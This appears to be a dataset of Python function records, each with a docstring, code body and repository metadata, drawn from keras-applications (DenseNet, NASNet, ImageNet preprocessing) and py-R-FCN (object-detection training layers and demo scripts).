{"docstring": "\"\"\"A building block for a dense block.\n\n# Arguments\n    x: input tensor.\n    growth_rate: float, growth rate at dense layers.\n    name: string, block label.\n\n# Returns\n    Output tensor for the block.\n\"\"\"\n", "func_signal": "def conv_block(x, growth_rate, name):\n", "code": "bn_axis = 3 if backend.image_data_format() == 'channels_last' else 1\nx1 = layers.BatchNormalization(axis=bn_axis,\n                               epsilon=1.001e-5,\n                               name=name + '_0_bn')(x)\nx1 = layers.Activation('relu', name=name + '_0_relu')(x1)\nx1 = layers.Conv2D(4 * growth_rate, 1,\n                   use_bias=False,\n                   name=name + '_1_conv')(x1)\nx1 = layers.BatchNormalization(axis=bn_axis, epsilon=1.001e-5,\n                               name=name + '_1_bn')(x1)\nx1 = layers.Activation('relu', name=name + '_1_relu')(x1)\nx1 = layers.Conv2D(growth_rate, 3,\n                   padding='same',\n                   use_bias=False,\n                   name=name + '_2_conv')(x1)\nx = layers.Concatenate(axis=bn_axis, name=name + '_concat')([x, x1])\nreturn x", "path": "keras-applications/keras_applications/densenet.py", "commit_date": "2018-10-25 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Preprocesses a Numpy array encoding a batch of images.\n\n# Arguments\n    x: Input array, 3D or 4D.\n    data_format: Data format of the image array.\n    mode: One of \"caffe\", \"tf\" or \"torch\".\n        - caffe: will convert the images from RGB to BGR,\n            then will zero-center each color channel with\n            respect to the ImageNet dataset,\n            without scaling.\n        - tf: will scale pixels between -1 and 1,\n            sample-wise.\n        - torch: will scale pixels between 0 and 1 and then\n            will normalize each channel with respect to the\n            ImageNet dataset.\n\n# Returns\n    Preprocessed Numpy array.\n\"\"\"\n", "func_signal": "def _preprocess_numpy_input(x, data_format, mode, **kwargs):\n", "code": "backend, _, _, _ = get_submodules_from_kwargs(kwargs)\nif not issubclass(x.dtype.type, np.floating):\n    x = x.astype(backend.floatx(), copy=False)\n\nif mode == 'tf':\n    x /= 127.5\n    x -= 1.\n    return x\n\nif mode == 'torch':\n    x /= 255.\n    mean = [0.485, 0.456, 0.406]\n    std = [0.229, 0.224, 0.225]\nelse:\n    if data_format == 'channels_first':\n        # 'RGB'->'BGR'\n        if x.ndim == 3:\n            x = x[::-1, ...]\n        else:\n            x = x[:, ::-1, ...]\n    else:\n        # 'RGB'->'BGR'\n        x = x[..., ::-1]\n    mean = [103.939, 116.779, 123.68]\n    std = None\n\n# Zero-center by mean pixel\nif data_format == 'channels_first':\n    if x.ndim == 3:\n        x[0, :, :] -= mean[0]\n        x[1, :, :] -= mean[1]\n        x[2, :, :] -= mean[2]\n        if std is not None:\n            x[0, :, :] /= std[0]\n            x[1, :, :] /= std[1]\n            x[2, :, :] /= std[2]\n    else:\n        x[:, 0, :, :] -= mean[0]\n        x[:, 1, :, :] -= mean[1]\n        x[:, 2, :, :] -= mean[2]\n        if std is not None:\n            x[:, 0, :, :] /= std[0]\n            x[:, 1, :, :] /= std[1]\n            x[:, 2, :, :] /= std[2]\nelse:\n    x[..., 0] -= mean[0]\n    x[..., 1] -= mean[1]\n    x[..., 2] -= mean[2]\n    if std is not None:\n        x[..., 0] /= std[0]\n        x[..., 1] /= std[1]\n        x[..., 2] /= std[2]\nreturn x", "path": "keras-applications/keras_applications/imagenet_utils.py", "commit_date": "2019-07-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Preprocesses a tensor encoding a batch of images.\n\n# Arguments\n    x: Input tensor, 3D or 4D.\n    data_format: Data format of the image tensor.\n    mode: One of \"caffe\", \"tf\" or \"torch\".\n        - caffe: will convert the images from RGB to BGR,\n            then will zero-center each color channel with\n            respect to the ImageNet dataset,\n            without scaling.\n        - tf: will scale pixels between -1 and 1,\n            sample-wise.\n        - torch: will scale pixels between 0 and 1 and then\n            will normalize each channel with respect to the\n            ImageNet dataset.\n\n# Returns\n    Preprocessed tensor.\n\"\"\"\n\n", "func_signal": "def _preprocess_symbolic_input(x, data_format, mode, **kwargs):\n", "code": "backend, _, _, _ = get_submodules_from_kwargs(kwargs)\n\nif mode == 'tf':\n    x /= 127.5\n    x -= 1.\n    return x\n\nif mode == 'torch':\n    x /= 255.\n    mean = [0.485, 0.456, 0.406]\n    std = [0.229, 0.224, 0.225]\nelse:\n    if data_format == 'channels_first':\n        # 'RGB'->'BGR'\n        if backend.ndim(x) == 3:\n            x = x[::-1, ...]\n        else:\n            x = x[:, ::-1, ...]\n    else:\n        # 'RGB'->'BGR'\n        x = x[..., ::-1]\n    mean = [103.939, 116.779, 123.68]\n    std = None\n\nmean_tensor = backend.constant(-np.array(mean))\n\n# Zero-center by mean pixel\nif backend.dtype(x) != backend.dtype(mean_tensor):\n    x = backend.bias_add(\n        x, backend.cast(mean_tensor, backend.dtype(x)),\n        data_format=data_format)\nelse:\n    x = backend.bias_add(x, mean_tensor, data_format)\nif std is not None:\n    x /= std\nreturn x", "path": "keras-applications/keras_applications/imagenet_utils.py", "commit_date": "2019-07-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "'''Adjusts the input `previous path` to match the shape of the `input`.\n\nUsed in situations where the output number of filters needs to be changed.\n\n# Arguments\n    p: Input tensor which needs to be modified\n    ip: Input tensor whose shape needs to be matched\n    filters: Number of output filters to be matched\n    block_id: String block_id\n\n# Returns\n    Adjusted Keras tensor\n'''\n", "func_signal": "def _adjust_block(p, ip, filters, block_id=None):\n", "code": "channel_dim = 1 if backend.image_data_format() == 'channels_first' else -1\nimg_dim = 2 if backend.image_data_format() == 'channels_first' else -2\n\nip_shape = backend.int_shape(ip)\n\nif p is not None:\n    p_shape = backend.int_shape(p)\n\nwith backend.name_scope('adjust_block'):\n    if p is None:\n        p = ip\n\n    elif p_shape[img_dim] != ip_shape[img_dim]:\n        with backend.name_scope('adjust_reduction_block_%s' % block_id):\n            p = layers.Activation('relu',\n                                  name='adjust_relu_1_%s' % block_id)(p)\n            p1 = layers.AveragePooling2D(\n                (1, 1),\n                strides=(2, 2),\n                padding='valid',\n                name='adjust_avg_pool_1_%s' % block_id)(p)\n            p1 = layers.Conv2D(\n                filters // 2, (1, 1),\n                padding='same',\n                use_bias=False, name='adjust_conv_1_%s' % block_id,\n                kernel_initializer='he_normal')(p1)\n\n            p2 = layers.ZeroPadding2D(padding=((0, 1), (0, 1)))(p)\n            p2 = layers.Cropping2D(cropping=((1, 0), (1, 0)))(p2)\n            p2 = layers.AveragePooling2D(\n                (1, 1),\n                strides=(2, 2),\n                padding='valid',\n                name='adjust_avg_pool_2_%s' % block_id)(p2)\n            p2 = layers.Conv2D(\n                filters // 2, (1, 1),\n                padding='same',\n                use_bias=False,\n                name='adjust_conv_2_%s' % block_id,\n                kernel_initializer='he_normal')(p2)\n\n            p = layers.concatenate([p1, p2], axis=channel_dim)\n            p = layers.BatchNormalization(\n                axis=channel_dim,\n                momentum=0.9997,\n                epsilon=1e-3,\n                name='adjust_bn_%s' % block_id)(p)\n\n    elif p_shape[channel_dim] != filters:\n        with backend.name_scope('adjust_projection_block_%s' % block_id):\n            p = layers.Activation('relu')(p)\n            p = layers.Conv2D(\n                filters,\n                (1, 1),\n                strides=(1, 1),\n                padding='same',\n                name='adjust_conv_projection_%s' % block_id,\n                use_bias=False,\n                kernel_initializer='he_normal')(p)\n            p = layers.BatchNormalization(\n                axis=channel_dim,\n                momentum=0.9997,\n                epsilon=1e-3,\n                name='adjust_bn_%s' % block_id)(p)\nreturn p", "path": "keras-applications/keras_applications/nasnet.py", "commit_date": "2019-03-29 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Function wrapper to clean up after TensorFlow tests.\n# Arguments\n    func: test function to clean up after.\n# Returns\n    A function wrapping the input function.\n\"\"\"\n", "func_signal": "def keras_test(func):\n", "code": "@six.wraps(func)\ndef wrapper(*args, **kwargs):\n    output = func(*args, **kwargs)\n    if backend.backend() == 'tensorflow' or backend.backend() == 'cntk':\n        backend.clear_session()\n    return output\nreturn wrapper", "path": "keras-applications/tests/applications_test.py", "commit_date": "2020-04-01 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"A dense block.\n\n# Arguments\n    x: input tensor.\n    blocks: integer, the number of building blocks.\n    name: string, block label.\n\n# Returns\n    output tensor for the block.\n\"\"\"\n", "func_signal": "def dense_block(x, blocks, name):\n", "code": "for i in range(blocks):\n    x = conv_block(x, 32, name=name + '_block' + str(i + 1))\nreturn x", "path": "keras-applications/keras_applications/densenet.py", "commit_date": "2018-10-25 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "# Test image batch with float and int image input\n", "func_signal": "def test_preprocess_input():\n", "code": "x = np.random.uniform(0, 255, (2, 10, 10, 3))\nxint = x.astype('int32')\nassert preprocess_input(x).shape == x.shape\nassert preprocess_input(xint).shape == xint.shape\n\nout1 = preprocess_input(x, 'channels_last')\nout1int = preprocess_input(xint, 'channels_last')\nout2 = preprocess_input(np.transpose(x, (0, 3, 1, 2)), 'channels_first')\nout2int = preprocess_input(np.transpose(xint, (0, 3, 1, 2)), 'channels_first')\nassert_allclose(out1, out2.transpose(0, 2, 3, 1))\nassert_allclose(out1int, out2int.transpose(0, 2, 3, 1))\n\n# Test single image\nx = np.random.uniform(0, 255, (10, 10, 3))\nxint = x.astype('int32')\nassert preprocess_input(x).shape == x.shape\nassert preprocess_input(xint).shape == xint.shape\n\nout1 = preprocess_input(x, 'channels_last')\nout1int = preprocess_input(xint, 'channels_last')\nout2 = preprocess_input(np.transpose(x, (2, 0, 1)), 'channels_first')\nout2int = preprocess_input(np.transpose(xint, (2, 0, 1)), 'channels_first')\nassert_allclose(out1, out2.transpose(1, 2, 0))\nassert_allclose(out1int, out2int.transpose(1, 2, 0))\n\n# Test that writing over the input data works predictably\nfor mode in ['torch', 'tf']:\n    x = np.random.uniform(0, 255, (2, 10, 10, 3))\n    xint = x.astype('int')\n    x2 = preprocess_input(x, mode=mode)\n    xint2 = preprocess_input(xint)\n    assert_allclose(x, x2)\n    assert xint.astype('float').max() != xint2.max()\n# Caffe mode works differently from the others\nx = np.random.uniform(0, 255, (2, 10, 10, 3))\nxint = x.astype('int')\nx2 = preprocess_input(x, data_format='channels_last', mode='caffe')\nxint2 = preprocess_input(xint)\nassert_allclose(x, x2[..., ::-1])\nassert xint.astype('float').max() != xint2.max()", "path": "keras-applications/tests/imagenet_utils_test.py", "commit_date": "2018-08-23 00:00:00", "repo_name": "keras-team/keras-applications", "stars": 1986, "license": "other", "language": "python", "size": 464}
{"docstring": "\"\"\"Return the roidb indices for the next minibatch.\"\"\"\n# TODO(rbg): remove duplicated code\n", "func_signal": "def _get_next_minibatch_inds(self):\n", "code": "if self._cur + cfg.TRAIN.IMS_PER_BATCH >= len(self._roidb):\n    self._shuffle_roidb_inds()\n\ndb_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]\nself._cur += cfg.TRAIN.IMS_PER_BATCH\nreturn db_inds", "path": "py-R-FCN/lib/roi_data_layer/layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Bounding-box regression targets (bbox_target_data) are stored in a\ncompact form N x (class, tx, ty, tw, th)\n\nThis function expands those targets into the 4-of-4*K representation used\nby the network (i.e. only one class has non-zero targets).\n\nReturns:\n    bbox_target (ndarray): N x 4K blob of regression targets\n    bbox_inside_weights (ndarray): N x 4K blob of loss weights\n\"\"\"\n\n", "func_signal": "def _get_bbox_regression_labels(bbox_target_data, num_classes):\n", "code": "clss = bbox_target_data[:, 0]\nbbox_targets = np.zeros((clss.size, 4 * num_classes), dtype=np.float32)\n# print 'proposal_target_layer:', bbox_targets.shape\nbbox_inside_weights = np.zeros(bbox_targets.shape, dtype=np.float32)\ninds = np.where(clss > 0)[0]\nif cfg.TRAIN.AGNOSTIC:\n    for ind in inds:\n        cls = clss[ind]\n        start = 4 * (1 if cls > 0 else 0)\n        end = start + 4\n        bbox_targets[ind, start:end] = bbox_target_data[ind, 1:]\n        bbox_inside_weights[ind, start:end] = cfg.TRAIN.BBOX_INSIDE_WEIGHTS\nelse:\n    for ind in inds:\n        cls = clss[ind]\n        start = 4 * cls\n        end = start + 4\n        bbox_targets[ind, start:end] = bbox_target_data[ind, 1:]\n        bbox_inside_weights[ind, start:end] = cfg.TRAIN.BBOX_INSIDE_WEIGHTS\nreturn bbox_targets, bbox_inside_weights", "path": "py-R-FCN/lib/rpn/proposal_target_layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n\n", "func_signal": "def _compute_targets(ex_rois, gt_rois, labels):\n", "code": "assert ex_rois.shape[0] == gt_rois.shape[0]\nassert ex_rois.shape[1] == 4\nassert gt_rois.shape[1] == 4\n\ntargets = bbox_transform(ex_rois, gt_rois)\nif cfg.TRAIN.BBOX_NORMALIZE_TARGETS_PRECOMPUTED:\n    # Optionally normalize targets by a precomputed mean and stdev\n    targets = ((targets - np.array(cfg.TRAIN.BBOX_NORMALIZE_MEANS))\n            / np.array(cfg.TRAIN.BBOX_NORMALIZE_STDS))\nreturn np.hstack(\n        (labels[:, np.newaxis], targets)).astype(np.float32, copy=False)", "path": "py-R-FCN/lib/rpn/proposal_target_layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Get blobs and copy them into this layer's top blob vector.\"\"\"\n", "func_signal": "def forward(self, bottom, top):\n", "code": "blobs = self._get_next_minibatch()\n\nfor blob_name, blob in blobs.iteritems():\n    top_ind = self._name_to_top_map[blob_name]\n    shape = blob.shape\n    if len(shape) == 1:\n        blob = blob.reshape(blob.shape[0], 1, 1, 1)\n    if len(shape) == 2 and blob_name != 'im_info':\n        blob = blob.reshape(blob.shape[0], blob.shape[1], 1, 1)\n    top[top_ind].reshape(*(blob.shape))\n    # Copy data into net's input blobs\n    top[top_ind].data[...] = blob.astype(np.float32, copy=False)", "path": "py-R-FCN/lib/roi_data_layer/layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\" Unmap a subset of item (data) back to the original set of items (of\nsize count) \"\"\"\n", "func_signal": "def _unmap(data, count, inds, fill=0):\n", "code": "if len(data.shape) == 1:\n    ret = np.empty((count, ), dtype=np.float32)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count, ) + data.shape[1:], dtype=np.float32)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "py-R-FCN/lib/rpn/anchor_target_layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n\n", "func_signal": "def _compute_targets(ex_rois, gt_rois):\n", "code": "assert ex_rois.shape[0] == gt_rois.shape[0]\nassert ex_rois.shape[1] == 4\nassert gt_rois.shape[1] == 5\n\ntargets = bbox_transform(ex_rois, gt_rois[:, :4]).astype(np.float32, copy=False)\nif cfg.TRAIN.RPN_NORMALIZE_TARGETS:\n    assert cfg.TRAIN.RPN_NORMALIZE_MEANS is not None\n    assert cfg.TRAIN.RPN_NORMALIZE_STDS is not None\n    targets -= cfg.TRAIN.RPN_NORMALIZE_MEANS\n    targets /= cfg.TRAIN.RPN_NORMALIZE_STDS\nreturn targets", "path": "py-R-FCN/lib/rpn/anchor_target_layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Parse input arguments.\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Faster R-CNN demo')\nparser.add_argument('--gpu', dest='gpu_id', help='GPU device id to use [0]',\n                    default=0, type=int)\nparser.add_argument('--cpu', dest='cpu_mode',\n                    help='Use CPU mode (overrides --gpu)',\n                    action='store_true')\nparser.add_argument('--net', dest='demo_net', help='Network to use [vgg16]',\n                    choices=NETS.keys(), default='vgg16')\n\nargs = parser.parse_args()\n\nreturn args", "path": "py-R-FCN/tools/demo.py", "commit_date": "2016-09-12 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Return the roidb indices for the next minibatch.\"\"\"\n", "func_signal": "def _get_next_minibatch_inds(self):\n", "code": "if self._cur + cfg.TRAIN.IMS_PER_BATCH >= len(self._roidb):\n    self._shuffle_roidb_inds()\n\ndb_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]\nself._cur += cfg.TRAIN.IMS_PER_BATCH\nreturn db_inds", "path": "py-R-FCN/lib/roi_data_layer/layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Test a Fast R-CNN network')\nparser.add_argument('--gpu', dest='gpu_id', help='GPU id to use',\n                    default=0, type=int)\nparser.add_argument('--def', dest='prototxt',\n                    help='prototxt file defining the network',\n                    default=None, type=str)\nparser.add_argument('--net', dest='caffemodel',\n                    help='model to test',\n                    default=None, type=str)\nparser.add_argument('--cfg', dest='cfg_file',\n                    help='optional config file', default=None, type=str)\nparser.add_argument('--wait', dest='wait',\n                    help='wait until net file exists',\n                    default=True, type=bool)\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to test',\n                    default='voc_2007_test', type=str)\nparser.add_argument('--set', dest='set_cfgs',\n                    help='set config keys', default=None,\n                    nargs=argparse.REMAINDER)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "py-R-FCN/tools/rpn_generate.py", "commit_date": "2016-09-12 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Return the blobs to be used for the next minibatch.\n\nIf cfg.TRAIN.USE_PREFETCH is True, then blobs will be computed in a\nseparate process and made available through self._blob_queue.\n\"\"\"\n", "func_signal": "def _get_next_minibatch(self):\n", "code": "if cfg.TRAIN.USE_PREFETCH:\n    return self._blob_queue.get()\nelse:\n    db_inds = self._get_next_minibatch_inds()\n    minibatch_db = [self._roidb[i] for i in db_inds]\n    return get_minibatch(minibatch_db, self._num_classes)", "path": "py-R-FCN/lib/roi_data_layer/layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Converts an image into a network input.\n\nArguments:\n    im (ndarray): a color image in BGR order\n\nReturns:\n    blob (ndarray): a data blob holding an image pyramid\n    im_scale_factors (list): list of image scales (relative to im) used\n        in the image pyramid\n\"\"\"\n", "func_signal": "def _get_image_blob(im):\n", "code": "im_orig = im.astype(np.float32, copy=True)\nim_orig -= cfg.PIXEL_MEANS\n\nim_shape = im_orig.shape\nim_size_min = np.min(im_shape[0:2])\nim_size_max = np.max(im_shape[0:2])\n\nprocessed_ims = []\n\nassert len(cfg.TEST.SCALES) == 1\ntarget_size = cfg.TEST.SCALES[0]\n\nim_scale = float(target_size) / float(im_size_min)\n# Prevent the biggest axis from being more than MAX_SIZE\nif np.round(im_scale * im_size_max) > cfg.TEST.MAX_SIZE:\n    im_scale = float(cfg.TEST.MAX_SIZE) / float(im_size_max)\nim = cv2.resize(im_orig, None, None, fx=im_scale, fy=im_scale,\n                interpolation=cv2.INTER_LINEAR)\nim_info = np.hstack((im.shape[:2], im_scale))[np.newaxis, :]\nprocessed_ims.append(im)\n\n# Create a blob to hold the input images\nblob = im_list_to_blob(processed_ims)\n\nreturn blob, im_info", "path": "py-R-FCN/lib/rpn/generate.py", "commit_date": "2016-11-08 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "# A roidb is a list of dictionaries, each with the following keys:\n#   boxes\n#   gt_overlaps\n#   gt_classes\n#   flipped\n", "func_signal": "def roidb(self):\n", "code": "if self._roidb is not None:\n    return self._roidb\nself._roidb = self.roidb_handler()\nreturn self._roidb", "path": "py-R-FCN/lib/datasets/imdb.py", "commit_date": "2016-09-12 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Detect object classes in an image using pre-computed object proposals.\"\"\"\n\n# Load the demo image\n", "func_signal": "def demo(net, image_name):\n", "code": "im_file = os.path.join(cfg.DATA_DIR, 'demo', image_name)\nim = cv2.imread(im_file)\n\n# Detect all object classes and regress object bounds\ntimer = Timer()\ntimer.tic()\nscores, boxes = im_detect(net, im)\ntimer.toc()\nprint ('Detection took {:.3f}s for '\n       '{:d} object proposals').format(timer.total_time, boxes.shape[0])\n\n# Visualize detections for each class\nCONF_THRESH = 0.8\nNMS_THRESH = 0.3\nfor cls_ind, cls in enumerate(CLASSES[1:]):\n    cls_ind += 1 # because we skipped background\n    cls_boxes = boxes[:, 4*cls_ind:4*(cls_ind + 1)]\n    cls_scores = scores[:, cls_ind]\n    dets = np.hstack((cls_boxes,\n                      cls_scores[:, np.newaxis])).astype(np.float32)\n    keep = nms(dets, NMS_THRESH)\n    dets = dets[keep, :]\n    vis_detections(im, cls, dets, thresh=CONF_THRESH)", "path": "py-R-FCN/tools/demo.py", "commit_date": "2016-09-12 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Generate RPN proposals on a single image.\"\"\"\n", "func_signal": "def im_proposals(net, im):\n", "code": "blobs = {}\nblobs['data'], blobs['im_info'] = _get_image_blob(im)\nnet.blobs['data'].reshape(*(blobs['data'].shape))\nnet.blobs['im_info'].reshape(*(blobs['im_info'].shape))\nblobs_out = net.forward(\n        data=blobs['data'].astype(np.float32, copy=False),\n        im_info=blobs['im_info'].astype(np.float32, copy=False))\n\nscale = blobs['im_info'][0, 2]\nboxes = blobs_out['rois'][:, 1:].copy() / scale\nscores = blobs_out['scores'].copy()\nreturn boxes, scores", "path": "py-R-FCN/lib/rpn/generate.py", "commit_date": "2016-11-08 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Randomly permute the training roidb.\"\"\"\n# TODO(rbg): remove duplicated code\n", "func_signal": "def _shuffle_roidb_inds(self):\n", "code": "self._perm = np.random.permutation(np.arange(len(self._roidb)))\nself._cur = 0", "path": "py-R-FCN/lib/roi_data_layer/layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Draw detected bounding boxes.\"\"\"\n", "func_signal": "def vis_detections(im, class_name, dets, thresh=0.5):\n", "code": "inds = np.where(dets[:, -1] >= thresh)[0]\nif len(inds) == 0:\n    return\n\nim = im[:, :, (2, 1, 0)]\nfig, ax = plt.subplots(figsize=(12, 12))\nax.imshow(im, aspect='equal')\nfor i in inds:\n    bbox = dets[i, :4]\n    score = dets[i, -1]\n\n    ax.add_patch(\n        plt.Rectangle((bbox[0], bbox[1]),\n                      bbox[2] - bbox[0],\n                      bbox[3] - bbox[1], fill=False,\n                      edgecolor='red', linewidth=3.5)\n        )\n    ax.text(bbox[0], bbox[1] - 2,\n            '{:s} {:.3f}'.format(class_name, score),\n            bbox=dict(facecolor='blue', alpha=0.5),\n            fontsize=14, color='white')\n\nax.set_title(('{} detections with '\n              'p({} | box) >= {:.1f}').format(class_name, class_name,\n                                              thresh),\n              fontsize=14)\nplt.axis('off')\nplt.tight_layout()\nplt.draw()", "path": "py-R-FCN/tools/demo.py", "commit_date": "2016-09-12 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Draw detected bounding boxes.\"\"\"\n", "func_signal": "def _vis_proposals(im, dets, thresh=0.5):\n", "code": "inds = np.where(dets[:, -1] >= thresh)[0]\nif len(inds) == 0:\n    return\n\nclass_name = 'obj'\nim = im[:, :, (2, 1, 0)]\nfig, ax = plt.subplots(figsize=(12, 12))\nax.imshow(im, aspect='equal')\nfor i in inds:\n    bbox = dets[i, :4]\n    score = dets[i, -1]\n\n    ax.add_patch(\n        plt.Rectangle((bbox[0], bbox[1]),\n                      bbox[2] - bbox[0],\n                      bbox[3] - bbox[1], fill=False,\n                      edgecolor='red', linewidth=3.5)\n        )\n    ax.text(bbox[0], bbox[1] - 2,\n            '{:s} {:.3f}'.format(class_name, score),\n            bbox=dict(facecolor='blue', alpha=0.5),\n            fontsize=14, color='white')\n\nax.set_title(('{} detections with '\n              'p({} | box) >= {:.1f}').format(class_name, class_name,\n                                              thresh),\n              fontsize=14)\nplt.axis('off')\nplt.tight_layout()\nplt.draw()", "path": "py-R-FCN/lib/rpn/generate.py", "commit_date": "2016-11-08 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Generate a random sample of RoIs comprising foreground and background\nexamples.\n\"\"\"\n# overlaps: (rois x gt_boxes)\n", "func_signal": "def _sample_rois(all_rois, gt_boxes, fg_rois_per_image, rois_per_image, num_classes):\n", "code": "overlaps = bbox_overlaps(\n    np.ascontiguousarray(all_rois[:, 1:5], dtype=np.float),\n    np.ascontiguousarray(gt_boxes[:, :4], dtype=np.float))\ngt_assignment = overlaps.argmax(axis=1)\nmax_overlaps = overlaps.max(axis=1)\nlabels = gt_boxes[gt_assignment, 4]\n\n# Select foreground RoIs as those with >= FG_THRESH overlap\nfg_inds = np.where(max_overlaps >= cfg.TRAIN.FG_THRESH)[0]\n# Guard against the case when an image has fewer than fg_rois_per_image\n# foreground RoIs\nfg_rois_per_this_image = min(fg_rois_per_image, fg_inds.size)\n# Sample foreground regions without replacement\nif fg_inds.size > 0:\n    fg_inds = npr.choice(fg_inds, size=fg_rois_per_this_image, replace=False)\n\n# Select background RoIs as those within [BG_THRESH_LO, BG_THRESH_HI)\nbg_inds = np.where((max_overlaps < cfg.TRAIN.BG_THRESH_HI) &\n                   (max_overlaps >= cfg.TRAIN.BG_THRESH_LO))[0]\n# Compute number of background RoIs to take from this image (guarding\n# against there being fewer than desired)\nbg_rois_per_this_image = rois_per_image - fg_rois_per_this_image\nbg_rois_per_this_image = min(bg_rois_per_this_image, bg_inds.size)\n# Sample background regions without replacement\nif bg_inds.size > 0:\n    bg_inds = npr.choice(bg_inds, size=bg_rois_per_this_image, replace=False)\n\n# The indices that we're selecting (both fg and bg)\nkeep_inds = np.append(fg_inds, bg_inds)\n# print 'proposal_target_layer:', keep_inds\n\n# Select sampled values from various arrays:\nlabels = labels[keep_inds]\n# Clamp labels for the background RoIs to 0\nlabels[fg_rois_per_this_image:] = 0\nrois = all_rois[keep_inds]\n\n# print 'proposal_target_layer:', rois\nbbox_target_data = _compute_targets(\n    rois[:, 1:5], gt_boxes[gt_assignment[keep_inds], :4], labels)\n\n# print 'proposal_target_layer:', bbox_target_data\nbbox_targets, bbox_inside_weights = \\\n    _get_bbox_regression_labels(bbox_target_data, num_classes)\n\nreturn labels, rois, bbox_targets, bbox_inside_weights", "path": "py-R-FCN/lib/rpn/proposal_target_layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "# (1, 3, 1, 1) shaped arrays\n", "func_signal": "def setup(self, bottom, top):\n", "code": "self.PIXEL_MEANS = \\\n    np.array([[[[0.48462227599918]],\n               [[0.45624044862054]],\n               [[0.40588363755159]]]])\nself.PIXEL_STDS = \\\n    np.array([[[[0.22889466674951]],\n               [[0.22446679341259]],\n               [[0.22495548344775]]]])\n# The default (\"old\") pixel means that were already subtracted\nchannel_swap = (0, 3, 1, 2)\nself.OLD_PIXEL_MEANS = \\\n    cfg.PIXEL_MEANS[np.newaxis, :, :, :].transpose(channel_swap)\n\ntop[0].reshape(*(bottom[0].shape))", "path": "py-R-FCN/lib/transform/torch_image_transform_layer.py", "commit_date": "2016-09-12 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
